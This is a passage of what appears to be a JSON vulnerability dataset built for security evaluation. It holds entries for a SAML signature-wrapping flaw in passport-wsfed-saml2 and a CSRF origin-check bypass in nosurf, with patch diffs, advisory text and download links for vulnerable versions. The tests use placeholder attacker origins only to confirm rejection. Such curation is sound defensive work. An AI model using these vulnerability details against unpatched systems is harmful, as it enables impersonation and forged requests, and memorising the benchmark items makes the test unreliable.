S548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature></saml:Assertion></t:RequestedSecurityToken></t:RequestSecurityTokenResponse>' }\n+          },\n+          function(err, response, body) {\n+            if(err) return done(err);\n+            r = response;\n+            bod = body;\n+            done();\n+          });\n     });\n \n     it('should return a 400', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n \n     it('should be recognized as an invalid xml', function(){\n       var err = JSON.parse(bod);\n       expect(err.message)\n-          .to.equal('wresult should be a valid xml');;\n+          .to.match(/^end tag name contains invalid characters/);\n     });\n   });\n-});\n+});\n\\ No newline at end of file\n```",
                "url": "https://github.com/auth0/passport-wsfed-saml2/commit/e5cf3cc2a53748207f7a81bfba9195c8efa94181"
            }
        ],
        "published_date": "2025-05-06T20:18:26.379Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nauth0\n/\npassport-wsfed-saml2\nPublic\nNotifications You must be signed in to change notification settings\nFork 61\nStar 49\nCode\nIssues\n21\nPull requests\n27\nActions\nProjects\nSecurity\n5\nInsights\nAdditional navigation options\nSAML Signature Wrapping Vulnerability Leading to User Impersonation\nCritical kevinroh-okta published GHSA-wjmp-wphq-jvqf last weekMay 6, 2025\nPackage\nnpm passport-wsfed-saml2\n(\nnpm\n)\nAffected versions\n>=3.0.5\nPatched versions\n4.6.4\nDescription\nOverview\nThis vulnerability allows an attacker to impersonate any user during SAML authentication by crafting a SAMLResponse. This can be done by using a valid SAML object that was signed by the configured IdP.\nAm I Affected?\nYou are affected by this SAML Signature Wrapping vulnerability if you are using passport-wsfed-saml2 version 4.5.1 or below, specifically under the following conditions:\nThe service provider is using passport-wsfed-saml2,\nA valid SAML document signed by the Identity Provider can be obtained.\nFix\nUpgrade to v4.6.4 or greater.\nSeverity\nCritical\nCVE ID\nCVE-2025-46572\nWeaknesses\nNo CWEs\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory describes the vulnerability and provides guidance and conditions under which it could be exploited, but it does not detail explicit steps or include a proof of concept.",
                "url": "https://github.com/auth0/passport-wsfed-saml2/security/advisories/GHSA-wjmp-wphq-jvqf"
            }
        ],
        "sw_version": "v3.0.5",
        "sw_version_wget": "https://github.com/auth0/passport-wsfed-saml2/archive/refs/tags/v3.0.5.zip"
    },
    "CVE-2025-46721": {
        "cwe": [
            {
                "id": "CWE-352",
                "value": "CWE-352: Cross-Site Request Forgery (CSRF)"
            }
        ],
        "description": "nosurf is cross-site request forgery (CSRF) protection middleware for Go. A vulnerability in versions prior to 1.2.0 allows an attacker who controls content on the target site, or on a subdomain of the target site (either via XSS, or otherwise) to bypass CSRF checks and issue requests on user's behalf. Due to misuse of the Go `net/http` library, nosurf categorizes all incoming requests as plain-text HTTP requests, in which case the `Referer` header is not checked to have the same origin as the target webpage. If the attacker has control over HTML contents on either the target website (e.g. `example.com`), or on a website hosted on a subdomain of the target (e.g. `attacker.example.com`), they will also be able to manipulate cookies set for the target website. By acquiring the secret CSRF token from the cookie, or overriding the cookie with a new token known to the attacker, `attacker.example.com` is able to craft cross-site requests to `example.com`. A patch for the issue was released in nosurf 1.2.0. In lieu of upgrading to a patched version of nosurf, users may additionally use another HTTP middleware to ensure that a non-safe HTTP request is coming from the same origin (e.g. by requiring a `Sec-Fetch-Site: same-origin` header in the request).",
        "languages": [
            "Go"
        ],
        "patch_commits": [
            {
                "content": "Rework origin checks (#74)\n\nAddresses CVE-2025-46721.\n\nFilename: docs/origin-checks.md:\n```\n@@ -0,0 +1,83 @@\n+# Trusted origin checks in nosurf\n+\n+Before version 1.2.0, nosurf did not correctly apply trusted origin checks for non-safe HTTP requests.\n+This resulted in [CVE-2025-46721](https://www.cve.org/CVERecord?id=CVE-2025-46721).\n+\n+To alleviate this, existing checks for the `Referer` header were fixed,\n+and additional methods of checking the origin of requests were added.\n+\n+As this was technically a breaking change in nosurf, this document attempts to shed light on how origin checks function in nosurf,\n+and how users can avoid potential breakage.\n+\n+\n+<!-- vim-markdown-toc GFM -->\n+\n+* [How does nosurf check the origin?](#how-does-nosurf-check-the-origin)\n+    * [1. `Sec-Fetch-Site` header](#1-sec-fetch-site-header)\n+    * [2. `Origin` or `Referer` headers](#2-origin-or-referer-headers)\n+* [What do I need to do after upgrading to 1.2.0?](#what-do-i-need-to-do-after-upgrading-to-120)\n+* [What are the risks of not upgrading to 1.2.0?](#what-are-the-risks-of-not-upgrading-to-120)\n+\n+<!-- vim-markdown-toc -->\n+\n+## How does nosurf check the origin?\n+\n+### 1. `Sec-Fetch-Site` header\n+\n+[`Sec-Fetch-Site`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site) is a request header\n+sent by [all modern browsers](https://caniuse.com/mdn-http_headers_sec-fetch-site).\n+If the incoming request contains a `Sec-Fetch-Site` header with the value `same-origin`,\n+nosurf lets the request through (subject to further verification of the CSRF token).\n+\n+### 2. `Origin` or `Referer` headers\n+\n+If the `Sec-Fetch-Site` header is not present on the incoming request, or has a value other than `same-origin`,\n+nosurf must directly compare the website's origin against the origin the request was made from.\n+\n+Web content's [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin) consists of\n+a *scheme* (usually `http` or `https`), followed by the host (e.g. `example.com`), optionally followed by a port\n+(if a non-standard HTTP/HTTPS port is used).\n+This raises a problem for nosurf: because TLS may be terminated before it reaches the Go application\n+(e.g. by a load balancer or a reverse proxy),\n+in the general case nosurf can not tell whether the website is being served over HTTPS.\n+However, that information is mandatory in order to know the full \"self\" origin of the website.\n+\n+By default, nosurf will assume that the website is using HTTPS.\n+This avoids breakage in most production scenarios, but (in conjunction with `Sec-Fetch-Site` not being present),\n+can cause errors in local development scenarios.\n+To this end, nosurf provides a [`SetIsTLSFunc`](https://pkg.go.dev/github.com/justinas/nosurf#CSRFHandler.SetIsTLSFunc) method.\n+This method requires a user-supplied delegate function, a boolean value indicating whether an incoming request is considered secure.\n+\n+After constructing a full \"self\" origin from this boolean indicator and the information found in the `Host` header,\n+nosurf will compare the value of the `Origin` header on the incoming request against the self-origin.\n+If the origins are equal, request will proceed with further CSRF token checks.\n+If the origins aren't equal, nosurf will invoke the user-supplied delegate (if any) set by calling \n+[`SetIsAllowedOriginFunc`](https://pkg.go.dev/github.com/justinas/nosurf#CSRFHandler.SetIsAllowedOriginFunc).\n+If the delegate returns `false`, the request will be considered cross-origin and get aborted.\n+\n+In the unlikely case where `Origin` header does not exist,\n+nosurf will perform the same validations documented above on the `Referer` header.\n+\n+In the very unlikely case that no `Referer` header is present either, the request will be aborted.\n+\n+## What do I need to do after upgrading to 1.2.0?\n+\n+* If your website does not utilize mutating cross-origin requests, and you have no visitors using grossly outdated browsers,\n+  the check for `Sec-Fetch-Site` will be sufficient, and you do not need to make any changes to your code.\n+* If you expect your site to be visited by user with outdated browsers that do not implement the `Sec-Fetch-Site` header,\n+  but the site is served via HTTPS and you do not expect cross-origin requests, you do not need to make any changes to your code.\n+* If you are serving via plaintext HTTP (some or all of the time), when configuring nosurf, you must call `SetIsTLSFunc()`,\n+  passing it a function that correctly determines this per individual request.\n+* If you expect cross-origin requests, you must call `SetIsAllowedOriginFunc()`,\n+  passing it a function that validates whether the origin is allowed to issue non-safe requests to your website.\n+\n+## What are the risks of not upgrading to 1.2.0?\n+\n+You may be susceptible to cross-site request forgery due to [CVE-2025-46721](https://www.cve.org/CVERecord?id=CVE-2025-46721).\n+\n+However, as nosurf's CSRF token validation logic is thought to be sound,\n+all known exploits require the attacker to have control over the HTML content of a page on your website,\n+or on a page hosted on a subdomain under your website's domain (e.g. `attacker.example.com` if your website is `example.com`)\n+in order to extract or override the CSRF token set in the cookie by nosurf.\n+\n+Despite the minimal risk, I recommend that you upgrade nosurf to the latest version.\n```\n\nFilename: handler.go:\n```\n@@ -28,10 +28,14 @@\nvar safeMethods = []string{\"GET\", \"HEAD\", \"OPTIONS\", \"TRACE\"}\n // reasons for CSRF check failures\n var (\n \tErrNoReferer  = errors.New(\"A secure request contained no Referer or its value was malformed\")\n-\tErrBadReferer = errors.New(\"A secure request's Referer comes from a different Origin\" +\n+\tErrBadReferer = errors.New(\"A secure request's Referer comes from a different origin\" +\n \t\t\" from the request's URL\")\n-\tErrBadToken = errors.New(\"The CSRF token in the cookie doesn't match the one\" +\n+\tErrBadOrigin = errors.New(\"Request was made with a disallowed origin specified in the Origin header\")\n+\tErrBadToken  = errors.New(\"The CSRF token in the cookie doesn't match the one\" +\n \t\t\" received in a form/header.\")\n+\n+\t// Internal error. When this is raised, and the request is secure, we additionally check for Referer.\n+\terrNoOrigin = errors.New(\"Origin header was not present\")\n )\n \n type CSRFHandler struct {\n\n@@ -45,7 +49,9 @@\ntype CSRFHandler struct {\n \tbaseCookie http.Cookie\n \n \t// Slices of paths that are exempt from CSRF checks.\n-\t// They can be specified by...\n+\t// All of those will be matched against Request.URL.Path,\n+\t// So they should take the leading slash into account\n+\t// Paths can be specified by...\n \t// ...an exact path,\n \texemptPaths []string\n \t// ...a regexp,\n\n@@ -55,8 +61,8 @@\ntype CSRFHandler struct {\n \t// ...or a custom matcher function\n \texemptFunc func(r *http.Request) bool\n \n-\t// All of those will be matched against Request.URL.Path,\n-\t// So they should take the leading slash into account\n+\tisTLS           func(r *http.Request) bool\n+\tisAllowedOrigin func(r *url.URL) bool\n }\n \n func defaultFailureHandler(w http.ResponseWriter, r *http.Request) {\n\n@@ -95,6 +101,7 @@\nfunc New(handler http.Handler) *CSRFHandler {\n \tcsrf := &CSRFHandler{successHandler: handler,\n \t\tfailureHandler: http.HandlerFunc(defaultFailureHandler),\n \t\tbaseCookie:     baseCookie,\n+\t\tisTLS:          func(r *http.Request) bool { return true },\n \t}\n \n \treturn csrf\n\n@@ -145,26 +152,10 @@\nfunc (h *CSRFHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n \t\treturn\n \t}\n \n-\t// if the request is secure, we enforce origin check\n-\t// for referer to prevent MITM of http->https requests\n-\tif r.URL.Scheme == \"https\" {\n-\t\treferer, err := url.Parse(r.Header.Get(\"Referer\"))\n-\n-\t\t// if we can't parse the referer or it's empty,\n-\t\t// we assume it's not specified\n-\t\tif err != nil || referer.String() == \"\" {\n-\t\t\tctxSetReason(r, ErrNoReferer)\n-\t\t\th.handleFailure(w, r)\n-\t\t\treturn\n-\t\t}\n-\n-\t\t// if the referer doesn't share origin with the request URL,\n-\t\t// we have another error for that\n-\t\tif !sameOrigin(referer, r.URL) {\n-\t\t\tctxSetReason(r, ErrBadReferer)\n-\t\t\th.handleFailure(w, r)\n-\t\t\treturn\n-\t\t}\n+\tif err := h.ensureSameOrigin(r); err != nil {\n+\t\tctxSetReason(r, err)\n+\t\th.handleFailure(w, r)\n+\t\treturn\n \t}\n \n \t// Finally, we check the token itself.\n\n@@ -193,6 +184,75 @@\nfunc (h *CSRFHandler) handleFailure(w http.ResponseWriter, r *http.Request) {\n \th.failureHandler.ServeHTTP(w, r)\n }\n \n+func (h *CSRFHandler) ensureSameOrigin(r *http.Request) error {\n+\tselfOrigin := &url.URL{\n+\t\tScheme: \"http\",\n+\t\tHost:   r.Host,\n+\t}\n+\tisTLS := h.isTLS(r)\n+\tif isTLS {\n+\t\tselfOrigin.Scheme = \"https\"\n+\t}\n+\n+\tsecFetchSite := r.Header.Get(\"Sec-Fetch-Site\")\n+\tif secFetchSite == \"same-origin\" {\n+\t\treturn nil\n+\t}\n+\n+\t// If no `Sec-Fetch-Site: same-origin` is present, fallback to Origin or Referer,\n+\t// including considering custom allowed origins.\n+\terr := h.checkOrigin(selfOrigin, r)\n+\tif err == nil {\n+\t\treturn nil\n+\t} else if !errors.Is(err, errNoOrigin) {\n+\t\treturn err\n+\t}\n+\n+\t// If Origin header was not present, fall back on Referer check for both secure and insecure requests.\n+\t// This is opposite of Django's behavior, but should be fine, as neither of the three headers existing is an edge case.\n+\t// https://github.com/django/django/blob/8be0c0d6901669661fca578f474cd51cd284d35a/django/middleware/csrf.py#L460\n+\treturn h.checkReferer(selfOrigin, r)\n+}\n+\n+func (h *CSRFHandler) checkReferer(selfOrigin *url.URL, r *http.Request) error {\n+\treferer, err := url.Parse(r.Referer())\n+\tif err != nil || referer.String() == \"\" {\n+\t\treturn ErrNoReferer\n+\t}\n+\n+\tif sameOrigin(selfOrigin, referer) {\n+\t\treturn nil\n+\t}\n+\n+\tif h.isAllowedOrigin != nil && h.isAllowedOrigin(referer) {\n+\t\treturn nil\n+\t}\n+\n+\treturn ErrBadReferer\n+}\n+\n+func (h *CSRFHandler) checkOrigin(selfOrigin *url.URL, r *http.Request) error {\n+\toriginStr := r.Header.Get(\"Origin\")\n+\tif originStr == \"\" || originStr == \"null\" {\n+\t\treturn errNoOrigin\n+\t}\n+\n+\torigin, err := url.Parse(originStr)\n+\tif err != nil {\n+\t\treturn err\n+\t}\n+\n+\tif sameOrigin(selfOrigin, origin) {\n+\t\treturn nil\n+\t}\n+\n+\tif h.isAllowedOrigin != nil && h.isAllowedOrigin(origin) {\n+\t\treturn nil\n+\t}\n+\n+\treturn ErrBadOrigin\n+}\n+\n // Generates a new token, sets it on the given request and returns it\n func (h *CSRFHandler) RegenerateToken(w http.ResponseWriter, r *http.Request) string {\n \ttoken := generateToken()\n\n@@ -224,3 +284,73 @@\nfunc (h *CSRFHandler) SetFailureHandler(handler http.Handler) {\n func (h *CSRFHandler) SetBaseCookie(cookie http.Cookie) {\n \th.baseCookie = cookie\n }\n+\n+// SetIsTLSFunc sets a delegate function which determines, on a per-request basis, whether the request is made over a secure connection.\n+// This should return `true` iff the URL that the user uses to access the application begins with https://.\n+// For example, if the Go web application is served via plain-text HTTP,\n+// but the user is accessing it through HTTPS via a TLS-terminating reverse-proxy, this should return `true`.\n+//\n+// Examples:\n+//\n+// 1. If you're using the Go TLS stack (no TLS-terminating proxies in between the user and the app), you may use:\n+//\n+//\th.SetIsTLSFunc(func(r *http.Request) bool { return r.TLS != nil })\n+//\n+// 2. If your application is behind a reverse proxy that terminates TLS, you should configure the reverse proxy\n+// to report the protocol that the request was made over via an HTTP header,\n+// e.g. `X-Forwarded-Proto`.\n+// You should also validate that the request is coming in from an IP of a trusted reverse proxy\n+// to ensure that this header has not been spoofed by an attacker. For example:\n+//\n+//\tvar trustedProxies = []string{\"198.51.100.1\", \"198.51.100.2\"}\n+//\th.SetIsTLSFunc(func(r *http.Request) bool {\n+//\t\tip, _, _ := strings.Cut(r.RemoteAddr, \":\")\n+//\t\tproto := r.Header.Get(\"X-Forwarded-Proto\")\n+//\t\treturn slices.Contains(trustedProxies, ip) && proto == \"https\"\n+//\t})\n+func (h *CSRFHandler) SetIsTLSFunc(f func(*http.Request) bool) {\n+\th.isTLS = f\n+}\n+\n+// SetAllowedOrigins defines a function that checks whether the request comes from an allowed origin.\n+// This function will be invoked when the request is not considered a same-origin request.\n+// If this function returns `false`, request will be disallowed.\n+//\n+// In most cases, this will be used with [StaticOrigins].\n+func (h *CSRFHandler) SetIsAllowedOriginFunc(f func(*url.URL) bool) {\n+\th.isAllowedOrigin = f\n+}\n+\n+// StaticOrigins returns a delegate, suitable for passing to [CSRFHandler.SetIsAllowedOriginFunc],\n+// that validates the request origin against a static list of allowed origins.\n+// This function expects each element to be of form `scheme://host`, e.g.: `https://example.com`, `http://example.org`.\n+// If any element of the slice is an invalid URL, this function will return an error.\n+// If an element includes additional URL parts (e.g. a path), these parts will be ignored,\n+// as origin checks only take the scheme and host into account.\n+//\n+// Example:\n+//\n+//\th := nosurf.New()\n+//\torigins, err := nosurf.StaticOrigins(\"https://api.example.com\", \"http://insecure.example.com\")\n+//\tif err != nil {\n+//\t\tpanic(err)\n+//\t}\n+//\th.SetIsAllowedOriginFunc(origins)\n+func StaticOrigins(origins ...string) (func(r *url.URL) bool, error) {\n+\tvar allowedOrigins []*url.URL\n+\tfor _, o := range origins {\n+\t\turl, err := url.Parse(o)\n+\t\tif err != nil {\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tallowedOrigins = append(allowedOrigins, url)\n+\t}\n+\treturn func(u *url.URL) bool {\n+\t\tfor _, candidate := range allowedOrigins {\n+\t\t\tif sameOrigin(candidate, u) {\n+\t\t\t\treturn true\n+\t\t\t}\n+\t\t}\n+\t\treturn false\n+\t}, nil\n+}\n```\n\nFilename: handler_test.go:\n```\n@@ -151,42 +151,209 @@\nfunc TestContextIsAccessible(t *testing.T) {\n \thand.ServeHTTP(writer, req)\n }\n \n-func TestEmptyRefererFails(t *testing.T) {\n-\thand := New(http.HandlerFunc(succHand))\n-\tfhand := correctReason(t, ErrNoReferer)\n-\thand.SetFailureHandler(fhand)\n-\n-\treq, err := http.NewRequest(\"POST\", \"https://dummy.us/\", strings.NewReader(\"a=b\"))\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n-\twriter := httptest.NewRecorder()\n-\n-\thand.ServeHTTP(writer, req)\n-\n-\tif writer.Code != FailureCode {\n-\t\tt.Errorf(\"A POST request with no Referer should have failed with the code %d, but it didn't.\",\n-\t\t\twriter.Code)\n-\t}\n-}\n+func TestRefererHandling(t *testing.T) {\n+\tconst host = \"example.com\"\n+\tvar allowedOrigins = []string{\"https://api.example.com\", \"http://example.org\"}\n+\ttestCases := []struct {\n+\t\tname         string\n+\t\tisTLS        bool\n+\t\treferer      string\n+\t\torigin       string\n+\t\tsecFetchSite string\n+\t\texpectReason error\n+\t}{\n+\t\t{\n+\t\t\tname:         \"no Referer nor Origin fails on secure requests\",\n+\t\t\tisTLS:        true,\n+\t\t\texpectReason: ErrNoReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"identical secure Referer passes\",\n+\t\t\tisTLS:        true,\n+\t\t\treferer:      \"https://example.com\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"differing Referer fails when Origin is absent\",\n+\t\t\tisTLS:        true,\n+\t\t\treferer:      \"https://attacker.lol\",\n+\t\t\texpectReason: ErrBadReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"mismatched Referer scheme fails when Origin is absent\",\n+\t\t\tisTLS:        true,\n+\t\t\treferer:      \"http://example.com\",\n+\t\t\texpectReason: ErrBadReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"mismatched Referer fails on insecure requests\",\n+\t\t\tisTLS:        false,\n+\t\t\treferer:      \"https://attacker.lol\",\n+\t\t\texpectReason: ErrBadReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"mismatched Origin fails on insecure requests\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"http://attacker.lol\",\n+\t\t\texpectReason: ErrBadOrigin,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"mismatched Origin fails on secure requests\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"http://attacker.lol\",\n+\t\t\treferer:      \"https://example.com\",\n+\t\t\texpectReason: ErrBadOrigin,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"mismatched Origin scheme fails on insecure requests\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"https://example.com\",\n+\t\t\texpectReason: ErrBadOrigin,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"mismatched Origin scheme fails on insecure requests\",\n+\t\t\tisTLS:        true,\n+\t\t\torigin:       \"http://example.com\",\n+\t\t\texpectReason: ErrBadOrigin,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"matching Origin passes on insecure requests\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"http://example.com\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"matching Origin passes on secure requests\",\n+\t\t\tisTLS:        true,\n+\t\t\torigin:       \"https://example.com\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"explicitly allowed insecure Origin passes\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"http://example.org\",\n+\t\t\treferer:      \"http://attacker.lol\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"explicitly allowed insecure Origin passes, despite a secure request\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"http://example.org\",\n+\t\t\treferer:      \"http://attacker.lol\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"explicitly allowed secure Origin passes\",\n+\t\t\tisTLS:        true,\n+\t\t\torigin:       \"https://api.example.com\",\n+\t\t\treferer:      \"http://attacker.lol\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"explicitly allowed insecure Origin passes, despite an insecure request\",\n+\t\t\tisTLS:        false,\n+\t\t\torigin:       \"https://api.example.com\",\n+\t\t\treferer:      \"http://attacker.lol\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"explicitly allowed Referer passes when Origin is absent\",\n+\t\t\tisTLS:        true,\n+\t\t\treferer:      \"http://example.org\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"Sec-Fetch-Site: same-origin is sufficient\",\n+\t\t\tisTLS:        true,\n+\t\t\tsecFetchSite: \"same-origin\",\n+\t\t\texpectReason: nil,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"Sec-Fetch-Site: same-site does not pass\",\n+\t\t\tisTLS:        true,\n+\t\t\tsecFetchSite: \"same-site\",\n+\t\t\texpectReason: ErrNoReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"Sec-Fetch-Site: none does not pass\",\n+\t\t\tisTLS:        true,\n+\t\t\tsecFetchSite: \"null\",\n+\t\t\texpectReason: ErrNoReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"no origin headers present, secure request does not pass\",\n+\t\t\tisTLS:        true,\n+\t\t\texpectReason: ErrNoReferer,\n+\t\t},\n+\t\t{\n+\t\t\tname:         \"no origin headers present, insecure request does not pass\",\n+\t\t\tisTLS:        false,\n+\t\t\texpectReason: ErrNoReferer,\n+\t\t},\n+\t}\n+\n+\tfor _, tc := range testCases {\n+\t\tt.Run(tc.name, func(t *testing.T) {\n+\t\t\thand := New(http.HandlerFunc(succHand))\n+\t\t\tfhand := correctReason(t, tc.expectReason)\n+\t\t\thand.SetFailureHandler(fhand)\n+\t\t\thand.SetIsTLSFunc(func(_ *http.Request) bool { return tc.isTLS })\n+\t\t\torigins, err := StaticOrigins(allowedOrigins...)\n+\t\t\tif err != nil {\n+\t\t\t\tt.Fatal(err)\n+\t\t\t}\n+\t\t\thand.SetIsAllowedOriginFunc(origins)\n \n-func TestDifferentOriginRefererFails(t *testing.T) {\n-\thand := New(http.HandlerFunc(succHand))\n-\tfhand := correctReason(t, ErrBadReferer)\n-\thand.SetFailureHandler(fhand)\n+\t\t\tserver := httptest.NewServer(hand)\n+\t\t\tt.Cleanup(func() { server.Close() })\n \n-\treq, err := http.NewRequest(\"POST\", \"https://dummy.us/\", strings.NewReader(\"a=b\"))\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n-\treq.Header.Set(\"Referer\", \"http://attack-on-golang.com\")\n-\twriter := httptest.NewRecorder()\n+\t\t\t// Issue a GET to fetch the token\n+\t\t\treq, err := http.NewRequest(http.MethodGet, server.URL, nil)\n+\t\t\tif err != nil {\n+\t\t\t\tt.Fatal(err)\n+\t\t\t}\n+\t\t\treq.Host = host\n \n-\thand.ServeHTTP(writer, req)\n+\t\t\tresp, err := server.Client().Do(req)\n+\t\t\tif err != nil {\n+\t\t\t\tt.Fatal(err)\n+\t\t\t}\n+\t\t\tcookie := getRespCookie(resp, CookieName)\n+\n+\t\t\t// Issue POST to check handling\n+\t\t\tfinalToken := b64encode(maskToken(b64decode(cookie.Value)))\n+\t\t\treq, err = http.NewRequest(\"POST\", server.URL, formBodyR([][]string{\n+\t\t\t\t{\"name\", \"Jolene\"},\n+\t\t\t\t{FormFieldName, finalToken},\n+\t\t\t}))\n+\t\t\tif err != nil {\n+\t\t\t\tt.Fatal(err)\n+\t\t\t}\n+\t\t\treq.Host = host\n+\t\t\treq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n+\t\t\tif tc.referer != \"\" {\n+\t\t\t\treq.Header.Set(\"Referer\", tc.referer)\n+\t\t\t}\n+\t\t\tif tc.origin != \"\" {\n+\t\t\t\treq.Header.Set(\"Origin\", tc.origin)\n+\t\t\t}\n+\t\t\tif tc.secFetchSite != \"\" {\n+\t\t\t\treq.Header.Set(\"Sec-Fetch-Site\", tc.secFetchSite)\n+\t\t\t}\n+\t\t\treq.AddCookie(cookie)\n+\t\t\tresp, err = server.Client().Do(req)\n+\t\t\tif err != nil {\n+\t\t\t\tt.Fatal(err)\n+\t\t\t}\n \n-\tif writer.Code != FailureCode {\n-\t\tt.Errorf(\"A POST request with a Referer from a different origin\"+\n-\t\t\t\"should have failed with the code %d, but it didn't.\", writer.Code)\n+\t\t\tif tc.expectReason == nil {\n+\t\t\t\tif resp.StatusCode != http.StatusOK {\n+\t\t\t\t\tt.Errorf(\"Expected request to succeed, but it failed with code %d\", resp.StatusCode)\n+\t\t\t\t}\n+\t\t\t} else if resp.StatusCode != FailureCode {\n+\t\t\t\tt.Errorf(\"Expected request to fail with status code %d, but the status code was %d\", FailureCode, resp.StatusCode)\n+\t\t\t}\n+\t\t})\n \t}\n }\n\n@@ -199,10 +366,12 @@\nfunc TestNoTokenFails(t *testing.T) {\n \t\t{\"name\", \"Jolene\"},\n \t}\n \n-\treq, err := http.NewRequest(\"POST\", \"http://dummy.us\", formBodyR(vals))\n+\treq, err := http.NewRequest(\"POST\", \"/\", formBodyR(vals))\n \tif err != nil {\n \t\tpanic(err)\n \t}\n+\treq.Host = \"example.com\"\n+\treq.Header.Add(\"Referer\", \"https://example.com\")\n \twriter := httptest.NewRecorder()\n \n \thand.ServeHTTP(writer, req)\n\n@@ -231,10 +400,12 @@\nfunc TestWrongTokenFails(t *testing.T) {\n \t\t{FormFieldName, \"$#%^&\"},\n \t}\n \n-\treq, err := http.NewRequest(\"POST\", \"http://dummy.us\", formBodyR(vals))\n+\treq, err := http.NewRequest(\"POST\", \"/\", formBodyR(vals))\n \tif err != nil {\n \t\tpanic(err)\n \t}\n+\treq.Host = \"example.com\"\n+\treq.Header.Add(\"Referer\", \"https://example.com\")\n \twriter := httptest.NewRecorder()\n \n \thand.ServeHTTP(writer, req)\n\n@@ -306,26 +477,26 @@\nfunc TestCorrectTokenPasses(t *testing.T) {\n \t}\n \n \t// Test usual POST\n-\t/*\n-\t\t{\n-\t\t\treq, err := http.NewRequest(\"POST\", server.URL, formBodyR(vals))\n-\t\t\tif err != nil {\n-\t\t\t\tt.Fatal(err)\n-\t\t\t}\n-\t\t\treq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n-\t\t\treq.AddCookie(cookie)\n+\t{\n+\t\treq, err := http.NewRequest(\"POST\", server.URL, formBodyR(vals))\n+\t\tif err != nil {\n+\t\t\tt.Fatal(err)\n+\t\t}\n+\t\treq.Host = \"example.com\"\n+\t\treq.Header.Add(\"Referer\", \"https://example.com\")\n+\t\treq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n+\t\treq.AddCookie(cookie)\n \n-\t\t\tresp, err = http.DefaultClient.Do(req)\n+\t\tresp, err = http.DefaultClient.Do(req)\n \n-\t\t\tif err != nil {\n-\t\t\t\tt.Fatal(err)\n-\t\t\t}\n-\t\t\tif resp.StatusCode != 200 {\n-\t\t\t\tt.Errorf(\"The request should have succeeded, but it didn't. Instead, the code was %d\",\n-\t\t\t\t\tresp.StatusCode)\n-\t\t\t}\n+\t\tif err != nil {\n+\t\t\tt.Fatal(err)\n \t\t}\n-\t*/\n+\t\tif resp.StatusCode != 200 {\n+\t\t\tt.Errorf(\"The request should have succeeded, but it didn't. Instead, the code was %d\",\n+\t\t\t\tresp.StatusCode)\n+\t\t}\n+\t}\n \n \t// Test multipart\n \t{\n\n@@ -357,7 +528,8 @@\nfunc TestCorrectTokenPasses(t *testing.T) {\n \t\tif err != nil {\n \t\t\tt.Fatal(err)\n \t\t}\n-\n+\t\treq.Host = \"example.com\"\n+\t\treq.Header.Add(\"Referer\", \"https://example.com\")\n \t\treq.Header.Add(\"Content-Type\", wr.FormDataContentType())\n \t\treq.AddCookie(cookie)\n\n@@ -405,6 +577,8 @@\nfunc TestPrefersHeaderOverFormValue(t *testing.T) {\n \tif err != nil {\n \t\tt.Fatal(err)\n \t}\n+\treq.Host = \"example.com\"\n+\treq.Header.Add(\"Referer\", \"https://example.com\")\n \treq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n \treq.Header.Set(HeaderName, finalToken)\n \treq.AddCookie(cookie)\n```",
                "url": "https://github.com/justinas/nosurf/commit/ec9bb776d8e5ba9e906b6eb70428f4e7b009feee"
            }
        ],
